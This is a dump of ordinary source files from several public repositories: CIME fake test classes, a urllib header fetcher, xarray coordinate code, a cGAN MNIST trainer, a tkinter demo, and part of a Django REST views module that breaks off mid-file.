self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        script = \\\n\"\"\"\necho Insta pass\necho SUCCESSFUL TERMINATION > {rundir}/{log}.log.$LID\ncp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\ncp {root}/scripts/tests/cpl.hi2.nc.test {rundir}/{case}.cpl.hi.0.nc.rest\n\"\"\".format(rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        super(TESTTESTDIFF, self).build_phase(sharedlib_only=sharedlib_only,\n                                              model_only=model_only)\n\n    def run_phase(self):\n        super(TESTTESTDIFF, self).run_phase()\n        self._component_compare_test(\"base\", \"rest\")\n\nclass TESTRUNFAIL(FakeTest):\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        script = \\\n\"\"\"\nif [ -z \"$TESTRUNFAIL_PASS\" ]; then\n  echo Insta fail\n  echo model failed > {rundir}/{log}.log.$LID\n  exit -1\nelse\n  echo Insta pass\n  echo SUCCESSFUL TERMINATION > {rundir}/{log}.log.$LID\n  cp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\nfi\n\"\"\".format(rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                             sharedlib_only=sharedlib_only, model_only=model_only)\n\nclass TESTRUNFAILEXC(TESTRUNPASS):\n\n    def run_phase(self):\n        raise RuntimeError(\"Exception from run_phase\")\n\nclass TESTRUNSTARCFAIL(TESTRUNPASS):\n\n    def _st_archive_case_test(self):\n        raise RuntimeError(\"Exception from st archive\")\n\nclass TESTBUILDFAIL(TESTRUNPASS):\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        if \"TESTBUILDFAIL_PASS\" in os.environ:\n            TESTRUNPASS.build_phase(self, sharedlib_only, model_only)\n        else:\n            if (not sharedlib_only):\n                blddir = self._case.get_value(\"EXEROOT\")\n                bldlog = os.path.join(blddir, \"{}.bldlog.{}\".format(get_model(), get_timestamp(\"%y%m%d-%H%M%S\")))\n                with open(bldlog, \"w\") as fd:\n                    fd.write(\"BUILD FAIL: Intentional fail for testing infrastructure\")\n\n                expect(False, \"BUILD FAIL: Intentional fail for testing infrastructure\")\n\nclass TESTBUILDFAILEXC(FakeTest):\n\n    def __init__(self, case):\n        FakeTest.__init__(self, case)\n        raise RuntimeError(\"Exception from init\")\n\nclass TESTRUNSLOWPASS(FakeTest):\n\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        script = \\\n\"\"\"\nsleep 300\necho Slow pass\necho SUCCESSFUL TERMINATION > {rundir}/{log}.log.$LID\ncp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\n\"\"\".format(rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                        sharedlib_only=sharedlib_only, model_only=model_only)\n\nclass TESTMEMLEAKFAIL(FakeTest):\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        testfile = os.path.join(cimeroot,\"scripts\",\"tests\",\"cpl.log.failmemleak.gz\")\n        script = \\\n\"\"\"\necho Insta pass\ngunzip -c {testfile} > {rundir}/{log}.log.$LID\ncp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\n\"\"\".format(testfile=testfile, rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                        sharedlib_only=sharedlib_only, model_only=model_only)\n\nclass TESTMEMLEAKPASS(FakeTest):\n    def build_phase(self, sharedlib_only=False, model_only=False):\n        rundir = self._case.get_value(\"RUNDIR\")\n        cimeroot = self._case.get_value(\"CIMEROOT\")\n        case = self._case.get_value(\"CASE\")\n        testfile = os.path.join(cimeroot,\"scripts\",\"tests\",\"cpl.log.passmemleak.gz\")\n        script = \\\n\"\"\"\necho Insta pass\ngunzip -c {testfile} > {rundir}/{log}.log.$LID\ncp {root}/scripts/tests/cpl.hi1.nc.test {rundir}/{case}.cpl.hi.0.nc\n\"\"\".format(testfile=testfile, rundir=rundir, log=self._cpllog, root=cimeroot, case=case)\n        self._set_script(script)\n        FakeTest.build_phase(self,\n                        sharedlib_only=sharedlib_only, model_only=model_only)\n"}
{"blob_id": "9b82b88fc5a020646441fdd248ed66c5eaa530a1", "directory_id": "23adda2e17a3912a02538f51b0edfec88a0a450f", "path": "/0x11-python-network_1/1-hbtn_header.py", "content_id": "75b4c560cb3cc311f42e65475dd330d8a9e21151", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Irene-Busah/holbertonschool-higher_level_programming-1", "snapshot_id": "249a0d58afb57a18914514271dac1432b5358762", "revision_id": "0c4272205fb32da37e8c4aedd2d22e571a510a0b", "branch_name": "refs/heads/master", "visit_date": "2022-12-23 13:54:40.980699", "revision_date": "2020-09-22 20:32:50", "committer_date": "2020-09-22 20:32:50", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "291", "extension": "py", "content": "#!/usr/bin/python3\n\"\"\" Response header value #0 \"\"\"\n\nif __name__ == \"__main__\":\n    import urllib.request\n    import sys\n\n    with urllib.request.urlopen(sys.argv[1]) as response:\n        if response is not None:\n            header = response.getheader('X-Request-Id')\n        print(header)\n"}
{"blob_id": "a4cedf78d3fd17985145eccb774a6e1a5d1f4ec6", "directory_id": "5c2aee80f5014a5f35e16526de60096fbfeab280", "path": "/xarray/core/coordinates.py", "content_id": "65949a2436964a8b4d0cb7c79c7f138aefd85a59", "detected_licenses": "['Apache-2.0', 'BSD-3-Clause', 'CC-BY-4.0', 'Python-2.0']", "license_type": "permissive", "repo_name": "raybellwaves/xarray", "snapshot_id": "198bd4cd5da93673fb42994c9258bf0d16296341", "revision_id": "d08bfea14971e99eaccbf720a5e14c1b7e0e51a8", "branch_name": "refs/heads/master", "visit_date": "2022-07-29 07:55:03.768922", "revision_date": "2022-07-04 20:01:48", "committer_date": "2022-07-04 20:01:48", "github_id": "317992595", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "Apache-2.0", "gha_event_created_at": "2020-12-02 21:11:54", "gha_created_at": "2020-12-02 21:11:54", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "13919", "extension": "py", "content": "from __future__ import annotations\n\nfrom contextlib import contextmanager\nfrom typing import TYPE_CHECKING, Any, Hashable, Iterator, Mapping, Sequence, cast\n\nimport numpy as np\nimport pandas as pd\n\nfrom . import formatting\nfrom .indexes import Index, Indexes, assert_no_index_corrupted\nfrom .merge import merge_coordinates_without_align, merge_coords\nfrom .utils import Frozen, ReprObject\nfrom .variable import Variable, calculate_dimensions\n\nif TYPE_CHECKING:\n    from .dataarray import DataArray\n    from .dataset import Dataset\n\n# Used as the key corresponding to a DataArray's variable when converting\n# arbitrary DataArray objects to datasets\n_THIS_ARRAY = ReprObject(\"<this-array>\")\n\n\nclass Coordinates(Mapping[Hashable, \"DataArray\"]):\n    __slots__ = ()\n\n    def __getitem__(self, key: Hashable) -> DataArray:\n        raise NotImplementedError()\n\n    def __setitem__(self, key: Hashable, value: Any) -> None:\n        self.update({key: value})\n\n    @property\n    def _names(self) -> set[Hashable]:\n        raise NotImplementedError()\n\n    @property\n    def dims(self) -> Mapping[Hashable, int] | tuple[Hashable, ...]:\n        raise NotImplementedError()\n\n    @property\n    def dtypes(self) -> Frozen[Hashable, np.dtype]:\n        raise NotImplementedError()\n\n    @property\n    def indexes(self) -> Indexes[pd.Index]:\n        return self._data.indexes  # type: ignore[attr-defined]\n\n    @property\n    def xindexes(self) -> Indexes[Index]:\n        return self._data.xindexes  # type: ignore[attr-defined]\n\n    @property\n    def variables(self):\n        raise NotImplementedError()\n\n    def _update_coords(self, coords, indexes):\n        raise NotImplementedError()\n\n    def __iter__(self) -> Iterator[Hashable]:\n        # needs to be in the same order as the dataset variables\n        for k in self.variables:\n            if k in self._names:\n                yield k\n\n    def __len__(self) -> int:\n        return len(self._names)\n\n    def __contains__(self, key: Hashable) -> bool:\n        return key in self._names\n\n    def __repr__(self) -> str:\n        return formatting.coords_repr(self)\n\n    def to_dataset(self) -> Dataset:\n        raise NotImplementedError()\n\n    def to_index(self, ordered_dims: Sequence[Hashable] = None) -> pd.Index:\n        \"\"\"Convert all index coordinates into a :py:class:`pandas.Index`.\n\n        Parameters\n        ----------\n        ordered_dims : sequence of hashable, optional\n            Possibly reordered version of this object's dimensions indicating\n            the order in which dimensions should appear on the result.\n\n        Returns\n        -------\n        pandas.Index\n            Index subclass corresponding to the outer-product of all dimension\n            coordinates. This will be a MultiIndex if this object is has more\n            than more dimension.\n        \"\"\"\n        if ordered_dims is None:\n            ordered_dims = list(self.dims)\n        elif set(ordered_dims) != set(self.dims):\n            raise ValueError(\n                \"ordered_dims must match dims, but does not: \"\n                \"{} vs {}\".format(ordered_dims, self.dims)\n            )\n\n        if len(ordered_dims) == 0:\n            raise ValueError(\"no valid index for a 0-dimensional object\")\n        elif len(ordered_dims) == 1:\n            (dim,) = ordered_dims\n            return self._data.get_index(dim)  # type: ignore[attr-defined]\n        else:\n            indexes = [\n                self._data.get_index(k) for k in ordered_dims  # type: ignore[attr-defined]\n            ]\n\n            # compute the sizes of the repeat and tile for the cartesian product\n            # (taken from pandas.core.reshape.util)\n            index_lengths = np.fromiter(\n                (len(index) for index in indexes), dtype=np.intp\n            )\n            cumprod_lengths = np.cumproduct(index_lengths)\n\n            if cumprod_lengths[-1] == 0:\n                # if any factor is empty, the cartesian product is empty\n                repeat_counts = np.zeros_like(cumprod_lengths)\n\n            else:\n                # sizes of the repeats\n                repeat_counts = cumprod_lengths[-1] / cumprod_lengths\n            # sizes of the tiles\n            tile_counts = np.roll(cumprod_lengths, 1)\n            tile_counts[0] = 1\n\n            # loop over the indexes\n            # for each MultiIndex or Index compute the cartesian product of the codes\n\n            code_list = []\n            level_list = []\n            names = []\n\n            for i, index in enumerate(indexes):\n                if isinstance(index, pd.MultiIndex):\n                    codes, levels = index.codes, index.levels\n                else:\n                    code, level = pd.factorize(index)\n                    codes = [code]\n                    levels = [level]\n\n                # compute the cartesian product\n                code_list += [\n                    np.tile(np.repeat(code, repeat_counts[i]), tile_counts[i])\n                    for code in codes\n                ]\n                level_list += levels\n                names += index.names\n\n        return pd.MultiIndex(level_list, code_list, names=names)\n\n    def update(self, other: Mapping[Any, Any]) -> None:\n        other_vars = getattr(other, \"variables\", other)\n        coords, indexes = merge_coords(\n            [self.variables, other_vars], priority_arg=1, indexes=self.xindexes\n        )\n        self._update_coords(coords, indexes)\n\n    def _merge_raw(self, other, reflexive):\n        \"\"\"For use with binary arithmetic.\"\"\"\n        if other is None:\n            variables = dict(self.variables)\n            indexes = dict(self.xindexes)\n        else:\n            coord_list = [self, other] if not reflexive else [other, self]\n            variables, indexes = merge_coordinates_without_align(coord_list)\n        return variables, indexes\n\n    @contextmanager\n    def _merge_inplace(self, other):\n        \"\"\"For use with in-place binary arithmetic.\"\"\"\n        if other is None:\n            yield\n        else:\n            # don't include indexes in prioritized, because we didn't align\n            # first and we want indexes to be checked\n            prioritized = {\n                k: (v, None)\n                for k, v in self.variables.items()\n                if k not in self.xindexes\n            }\n            variables, indexes = merge_coordinates_without_align(\n                [self, other], prioritized\n            )\n            yield\n            self._update_coords(variables, indexes)\n\n    def merge(self, other: Coordinates | None) -> Dataset:\n        \"\"\"Merge two sets of coordinates to create a new Dataset\n\n        The method implements the logic used for joining coordinates in the\n        result of a binary operation performed on xarray objects:\n\n        - If two index coordinates conflict (are not equal), an exception is\n          raised. You must align your data before passing it to this method.\n        - If an index coordinate and a non-index coordinate conflict, the non-\n          index coordinate is dropped.\n        - If two non-index coordinates conflict, both are dropped.\n\n        Parameters\n        ----------\n        other : DatasetCoordinates or DataArrayCoordinates\n            The coordinates from another dataset or data array.\n\n        Returns\n        -------\n        merged : Dataset\n            A new Dataset with merged coordinates.\n        \"\"\"\n        from .dataset import Dataset\n\n        if other is None:\n            return self.to_dataset()\n\n        if not isinstance(other, Coordinates):\n            other = Dataset(coords=other).coords\n\n        coords, indexes = merge_coordinates_without_align([self, other])\n        coord_names = set(coords)\n        return Dataset._construct_direct(\n            variables=coords, coord_names=coord_names, indexes=indexes\n        )\n\n\nclass DatasetCoordinates(Coordinates):\n    \"\"\"Dictionary like container for Dataset coordinates.\n\n    Essentially an immutable dictionary with keys given by the array's\n    dimensions and the values given by the corresponding xarray.Coordinate\n    objects.\n    \"\"\"\n\n    __slots__ = (\"_data\",)\n\n    def __init__(self, dataset: Dataset):\n        self._data = dataset\n\n    @property\n    def _names(self) -> set[Hashable]:\n        return self._data._coord_names\n\n    @property\n    def dims(self) -> Mapping[Hashable, int]:\n        return self._data.dims\n\n    @property\n    def dtypes(self) -> Frozen[Hashable, np.dtype]:\n        \"\"\"Mapping from coordinate names to dtypes.\n\n        Cannot be modified directly, but is updated when adding new variables.\n\n        See Also\n        --------\n        Dataset.dtypes\n        \"\"\"\n        return Frozen(\n            {\n                n: v.dtype\n                for n, v in self._data._variables.items()\n                if n in self._data._coord_names\n            }\n        )\n\n    @property\n    def variables(self) -> Mapping[Hashable, Variable]:\n        return Frozen(\n            {k: v for k, v in self._data.variables.items() if k in self._names}\n        )\n\n    def __getitem__(self, key: Hashable) -> DataArray:\n        if key in self._data.data_vars:\n            raise KeyError(key)\n        return cast(\"DataArray\", self._data[key])\n\n    def to_dataset(self) -> Dataset:\n        \"\"\"Convert these coordinates into a new Dataset\"\"\"\n\n        names = [name for name in self._data._variables if name in self._names]\n        return self._data._copy_listed(names)\n\n    def _update_coords(\n        self, coords: dict[Hashable, Variable], indexes: Mapping[Any, Index]\n    ) -> None:\n        variables = self._data._variables.copy()\n        variables.update(coords)\n\n        # check for inconsistent state *before* modifying anything in-place\n        dims = calculate_dimensions(variables)\n        new_coord_names = set(coords)\n        for dim, size in dims.items():\n            if dim in variables:\n                new_coord_names.add(dim)\n\n        self._data._variables = variables\n        self._data._coord_names.update(new_coord_names)\n        self._data._dims = dims\n\n        # TODO(shoyer): once ._indexes is always populated by a dict, modify\n        # it to update inplace instead.\n        original_indexes = dict(self._data.xindexes)\n        original_indexes.update(indexes)\n        self._data._indexes = original_indexes\n\n    def __delitem__(self, key: Hashable) -> None:\n        if key in self:\n            del self._data[key]\n        else:\n            raise KeyError(f\"{key!r} is not a coordinate variable.\")\n\n    def _ipython_key_completions_(self):\n        \"\"\"Provide method for the key-autocompletions in IPython.\"\"\"\n        return [\n            key\n            for key in self._data._ipython_key_completions_()\n            if key not in self._data.data_vars\n        ]\n\n\nclass DataArrayCoordinates(Coordinates):\n    \"\"\"Dictionary like container for DataArray coordinates.\n\n    Essentially a dict with keys given by the array's\n    dimensions and the values given by corresponding DataArray objects.\n    \"\"\"\n\n    __slots__ = (\"_data\",)\n\n    def __init__(self, dataarray: DataArray):\n        self._data = dataarray\n\n    @property\n    def dims(self) -> tuple[Hashable, ...]:\n        return self._data.dims\n\n    @property\n    def dtypes(self) -> Frozen[Hashable, np.dtype]:\n        \"\"\"Mapping from coordinate names to dtypes.\n\n        Cannot be modified directly, but is updated when adding new variables.\n\n        See Also\n        --------\n        DataArray.dtype\n        \"\"\"\n        return Frozen({n: v.dtype for n, v in self._data._coords.items()})\n\n    @property\n    def _names(self) -> set[Hashable]:\n        return set(self._data._coords)\n\n    def __getitem__(self, key: Hashable) -> DataArray:\n        return self._data._getitem_coord(key)\n\n    def _update_coords(\n        self, coords: dict[Hashable, Variable], indexes: Mapping[Any, Index]\n    ) -> None:\n        coords_plus_data = coords.copy()\n        coords_plus_data[_THIS_ARRAY] = self._data.variable\n        dims = calculate_dimensions(coords_plus_data)\n        if not set(dims) <= set(self.dims):\n            raise ValueError(\n                \"cannot add coordinates with new dimensions to a DataArray\"\n            )\n        self._data._coords = coords\n\n        # TODO(shoyer): once ._indexes is always populated by a dict, modify\n        # it to update inplace instead.\n        original_indexes = dict(self._data.xindexes)\n        original_indexes.update(indexes)\n        self._data._indexes = original_indexes\n\n    @property\n    def variables(self):\n        return Frozen(self._data._coords)\n\n    def to_dataset(self) -> Dataset:\n        from .dataset import Dataset\n\n        coords = {k: v.copy(deep=False) for k, v in self._data._coords.items()}\n        indexes = dict(self._data.xindexes)\n        return Dataset._construct_direct(coords, set(coords), indexes=indexes)\n\n    def __delitem__(self, key: Hashable) -> None:\n        if key not in self:\n            raise KeyError(f\"{key!r} is not a coordinate variable.\")\n        assert_no_index_corrupted(self._data.xindexes, {key})\n\n        del self._data._coords[key]\n        if self._data._indexes is not None and key in self._data._indexes:\n            del self._data._indexes[key]\n\n    def _ipython_key_completions_(self):\n        \"\"\"Provide method for the key-autocompletions in IPython.\"\"\"\n        return self._data._ipython_key_completions_()\n\n\ndef assert_coordinate_consistent(\n    obj: DataArray | Dataset, coords: Mapping[Any, Variable]\n) -> None:\n    \"\"\"Make sure the dimension coordinate of obj is consistent with coords.\n\n    obj: DataArray or Dataset\n    coords: Dict-like of variables\n    \"\"\"\n    for k in obj.dims:\n        # make sure there are no conflict in dimension coordinates\n        if k in coords and k in obj.coords and not coords[k].equals(obj[k].variable):\n            raise IndexError(\n                f\"dimension coordinate {k!r} conflicts between \"\n                f\"indexed and indexing objects:\\n{obj[k]}\\nvs.\\n{coords[k]}\"\n            )\n"}
{"blob_id": "f4f408219b73c84eb086547a0e6a062ab9574913", "directory_id": "233a01b1387a7e4bde489b6caac97ef19bd6db8a", "path": "/cGAN_MNIST.py", "content_id": "e6c647f05f7bf69acbfa62c4d1bdf737760c41dd", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "Jerem-35/GanExamples", "snapshot_id": "6a572cb2a0e34a7855d06e74c58bd01943136d0c", "revision_id": "93c437879ef466462b92cb459c24bf9a2f29a2f3", "branch_name": "refs/heads/master", "visit_date": "2020-04-10 06:12:27.505282", "revision_date": "2019-01-02 15:57:12", "committer_date": "2019-01-02 15:57:12", "github_id": "160848428", "star_events_count": "2", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7106", "extension": "py", "content": "import os\nimport numpy as np\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nfrom torchvision import datasets, transforms\nfrom torchvision.utils import save_image\n\n######################################################################################################################################\n######################################################################################################################################\n##\n##  Impelementation of cGAN on MNIST dataset\n##  I referred to following examples to develop this sample :\n##  https://github.com/yunjey/pytorch-tutorial/blob/master/tutorials/03-advanced/generative_adversarial_network/main.py\n##  https://github.com/eriklindernoren/PyTorch-GAN/blob/master/implementations/cgan/cgan.py\n##  https://github.com/znxlwm/pytorch-MNIST-CelebA-cGAN-cDCGAN/blob/master/pytorch_MNIST_cGAN.py\n######################################################################################################################################\n######################################################################################################################################\n\ndef denorm(x):\n    out = (x + 1) / 2\n    return out.clamp(0, 1)\n\n# Choose GPU or CPU\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\nprint(\"Current Device \" , device)\n# Change here hyper parameters\nbatch_size = 50\nlatent_size = 128\nhidden_size = 512\nimage_size = 784\nlr = 0.0002\nnb_classes = 10\nnum_epochs = 100 # Results become interesting from epoch ~20\n\nresul_dir = 'ResulcGan'\nif not os.path.exists(resul_dir):\n    os.makedirs(resul_dir)\n\n\n\n\ndataTransform = transforms.Compose([\n                transforms.ToTensor(),\n                transforms.Normalize(mean=(0.5, 0.5, 0.5),   # 3 for RGB channels\n                                     std=(0.5, 0.5, 0.5))])\n# MNIST Train data set\ntrain_loader = torch.utils.data.DataLoader(datasets.MNIST('mnist_data', \n                                                          download=True, \n                                                          train=True,\n                                                          transform=dataTransform), \n                                           batch_size=batch_size, \n                                           shuffle=True)\n\n\n#Discriminator model\nclass Discriminator(nn.Module):\n    def __init__(self , input_size, hidden_size, output_size):\n         super(Discriminator, self).__init__()\n         self.linear1 = nn.Linear(input_size+nb_classes , hidden_size)\n         self.linear2 = nn.Linear(hidden_size , hidden_size)\n         self.linear3 = nn.Linear(hidden_size, output_size)\n         self.label_embedding = nn.Embedding(nb_classes, nb_classes)\n     #image and label\n    def forward(self, x, y ):\n        x = torch.cat((self.label_embedding(y), x), -1)\n        x = F.relu(self.linear1(x)) \n        x = F.relu(self.linear2(x)) \n        x = self.linear3(x)\n        return torch.sigmoid(x)\n\n# Generator Model\nclass Generator(nn.Module):\n\n    def __init__(self , input_size, hidden_size, output_size):\n         super(Generator, self).__init__()\n         self.linear1 = nn.Linear(input_size+nb_classes, hidden_size)\n         self.linear2 = nn.Linear(hidden_size , hidden_size)\n         self.linear3 = nn.Linear(hidden_size, output_size)\n         self.label_embedding = nn.Embedding(nb_classes, nb_classes)\n    # x random  y labels\n    def forward(self, x, y):\n        x = torch.cat((self.label_embedding(y), x), -1)\n        x = F.relu(self.linear1(x)) \n        x = F.relu(self.linear2(x)) \n        x= self.linear3(x)\n        return torch.tanh(x) #Tied Sigmoid instead : did not work\n\n\n#initialize discriminator and generator\nD = Discriminator(image_size, hidden_size ,1).to(device) ;\nG = Generator(latent_size , hidden_size,image_size).to(device)\n\n#Adam optimization \noptimizerD = torch.optim.Adam(D.parameters(), lr)\noptimizerG = torch.optim.Adam(G.parameters(), lr)\n# Binary cross entropy loss\ncriterion = nn.BCELoss()\n\n\n\ntotal_step = len(train_loader)\n\nfor epoch in range(num_epochs):\n    for batch_idx, (x, target) in enumerate(train_loader):\n\n        images = x.reshape(batch_size, -1).to(device)\n        realLabel = torch.ones(batch_size, 1).to(device)\n        fakeLabel = torch.zeros(batch_size, 1).to(device)\n       \n        target = torch.LongTensor(target).to(device)\n        \n        # TRAIN D\n        # On true data\n        predictR = D(images, target) #image from the real dataset\n        loss_real = criterion(predictR.squeeze(), realLabel.squeeze())  # compare vs label =1 (D is supposed to \"understand\" that the image is real)\n        real_score = predictR\n\n        # On fake data\n        latent_value = torch.randn((batch_size, latent_size)).to(device)\n        gen_labels = torch.LongTensor(np.random.randint(0, nb_classes, batch_size)).to(device)\n        fake_images = G(latent_value , gen_labels) #generate a fake image\n        predictF = D(fake_images , gen_labels)\n        loss_fake = criterion(predictF , fakeLabel) # compare vs label =0 (D is supposed to \"understand\" that the image generated by G is fake)\n        fake_score = predictF\n\n        lossD = loss_real + loss_fake \n\n        optimizerD.zero_grad() \n        optimizerG.zero_grad() \n        lossD.backward()\n        optimizerD.step() \n        \n        # TRAIN G\n        latent_value = torch.randn((batch_size, latent_size)).to(device)\n        gen_labels = torch.LongTensor(np.random.randint(0, nb_classes, batch_size)).to(device)\n        fake_images= G(latent_value , gen_labels) #Generate a fake image\n        predictG = D(fake_images , gen_labels)\n        lossG = criterion(predictG , realLabel) # Compare vs label = 1 (We want to optimize G to fool D, predictG must tend to 1)\n        optimizerD.zero_grad() \n        optimizerG.zero_grad() \n        lossG.backward()\n        optimizerG.step() \n\n        if (batch_idx+1) % 200 == 0:\n            print(\"Epoch: \"+str(epoch)+\"/\"+str(num_epochs)+ \"  -- Batch:\"+ str(batch_idx+1)+\"/\"+str(total_step))\n            print(\"     GenLoss \"+str(round(lossG.item(), 3))+ \"  --  DiscLoss \"+str(round(lossD.item(), 3)))\n            print(\"     D(x): \"+str(round(real_score.mean().item(), 3))+ \"  -- D(G(z)):\"+str(round(fake_score.mean().item(), 3)))\n\n    # Save real images\n    if (epoch+1) == 1:\n        images = images.reshape(images.size(0), 1, 28, 28)\n        save_image(denorm(images), os.path.join(resul_dir, 'real_images.png'))\n    \n    # Save sampled images\n    fake_images = fake_images.reshape(fake_images.size(0), 1, 28, 28)\n    save_image(denorm(fake_images), os.path.join(resul_dir, 'fake_images-{}.png'.format(epoch+1)))\n\n\n# generate samples for all labels\nnbImageToGenerate = 8*8\nfor i in range(10):\n    latent_value = torch.randn((nbImageToGenerate, latent_size)).to(device)\n    gen_labels = torch.LongTensor(np.full(nbImageToGenerate , i )).to(device)\n    fake_images = G(latent_value , gen_labels) #Generate a fake image\n    fake_images = fake_images.reshape(fake_images.size(0), 1, 28, 28)\n    save_image(denorm(fake_images), os.path.join(resul_dir, 'GeneratedSample-{}.png'.format(i)))"}
{"blob_id": "acfbfee0a60b092c41b1b384dc05a7b9ba86daf2", "directory_id": "b8a70e10cc32bfad0c20c15a4bc96bad03fda41a", "path": "/entry2.py", "content_id": "edb8bd1df6bc16f92c7f0ee6b152e94d7edf96d2", "detected_licenses": "['LicenseRef-scancode-unknown-license-reference', 'MIT']", "license_type": "permissive", "repo_name": "codio-packs/tkinter-widgets", "snapshot_id": "4a68817a79b4959d62b7acab6f8ca8925288c606", "revision_id": "c35886b7b3a9ca49f0af8a47c8c21e84c117e512", "branch_name": "refs/heads/master", "visit_date": "2020-12-31 06:55:19.938208", "revision_date": "2016-05-16 08:59:15", "committer_date": "2016-05-16 08:59:15", "github_id": "58918061", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2820", "extension": "py", "content": "\nfrom tkinter import *\n\nfrom infrastructure import DemoWindow\n\n# For some reason, the 'xview' method of Entry class does not work\n# like the 'xview' methods of other widgets. It accepts only an 'index'\n# argument, instead of the usual variable-lebgth list.\n# Therefore, doing the usual scrollbar['command']=entry.xview generates\n# an error (wrong number of arguments) every time the scrollbar is\n# moved.\n# To bypass this, I created my own subclass of Entry widget,\n# to which I added an 'xview2' method, which I can use instead od xview\n#\n\nclass MyEntry( Entry ):\n    def __init__(self, master=None):\n        Entry.__init__(self, master)\n\n    def xview2(self, *what):\n        if not what:\n            return self._getdoubles(self.tk.call(self._w, 'xview'))\n        self.tk.call((self._w, 'xview') + what)\n\n        \n\nclass ScrolledEntryDemoWindow(DemoWindow):\n\n    def __init__(self):\n        l = \"\"\"Three different entries are displayed below, with a\n        scrollbar for each entry.  You can add characters by pointing,\n        clicking and typing.  The normal Motif editing characters are\n        supported, along with many Emacs bindings.  For example,\n        Backspace and Control-h delete the character to the left of\n        the insertion cursor and Delete and Control-d delete the\n        chararacter to the right of the insertion cursor.\n        For entries that are too large to fit in the window all at\n        once, you can scan through the entries with the scrollbars,\n        or by dragging with mouse button2 pressed.\"\"\"\n        \n        DemoWindow.__init__(self, l, 'entry2.py' )\n\n\n        frame = Frame(self); frame.pack(expand=YES, fill=BOTH)\n\n        f1,w1,sbar1 = self.create_scrollable_entry(frame)\n        f2,w2,sbar2 = self.create_scrollable_entry(frame)\n        f3,w3,sbar3 = self.create_scrollable_entry(frame)\n        \n        for f in f1,f2,f3:\n            f.pack(side=TOP, expand=Y, fill=X,padx=5, pady=10 )\n\n        w1.insert(0, 'Initial value')\n\n        w2.insert(0,\"This entry contains a value much too long \")\n        w2.insert(END,\"to fit in the window at one time, so long in fact\")\n        w2.insert(END,\" that you will have to scroll or scan to see the end.\")\n\n        \n    def create_scrollable_entry(self, master):\n        \"\"\"This routine creates a frame with inside an entry and\n        a connected horizontal scroll bar\"\"\"\n        f = Frame(master)\n        e = MyEntry(f)\n        sbar = Scrollbar(f, orient='horiz' )\n\n        e.pack(side=TOP, expand=Y, fill=X )\n        sbar.pack(side=TOP, expand=Y, fill=X )\n\n        sbar['command'] = e.xview2 # xview does not work. See comments before\n        e['xscrollcommand'] = sbar.set\n\n        \n        return f,e,sbar\n\n\nrunDemo = ScrolledEntryDemoWindow\n\nif __name__ == '__main__':\n    demo = ScrolledEntryDemoWindow()\n    mainloop()\n\n"}
{"blob_id": "ca4a62d92d3186e5cb08b705d44df85d56989933", "directory_id": "8f71469c5ef8d3ff1d339e7c658d88c53d18b1f6", "path": "/oreilly_lightweight_django/chapter_4a/scrum/board/views.py", "content_id": "9309b14db281966b95be995db6a10f099a5acb12", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "orionempire/django_tutorial", "snapshot_id": "97889888f9298ed9c94efe21be7746f3970d2fa2", "revision_id": "e488d31a681b5bcd1bcb0a08856dc2b259c334b4", "branch_name": "refs/heads/master", "visit_date": "2021-01-23 12:06:22.522835", "revision_date": "2018-01-02 16:14:14", "committer_date": "2018-01-02 16:14:14", "github_id": "102524420", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1806", "extension": "py", "content": "from django.contrib.auth import get_user_model\n\nfrom rest_framework import authentication, permissions, viewsets, filters\n\nfrom .forms import SprintFilter, TaskFilter\nfrom .models import Sprint, Task\nfrom .serializers import SprintSerializer, TaskSerializer, UserSerializer\n\nUser = get_user_model()\n\n\nclass DefaultsMixin(object):\n    \"\"\"Default settings for view authentication, permissions, filtering\n     and pagination.\"\"\"\n\n    authentication_classes = (\n        authentication.BasicAuthentication,\n        authentication.TokenAuthentication,\n    )\n    permission_classes = (\n        permissions.IsAuthenticated,\n    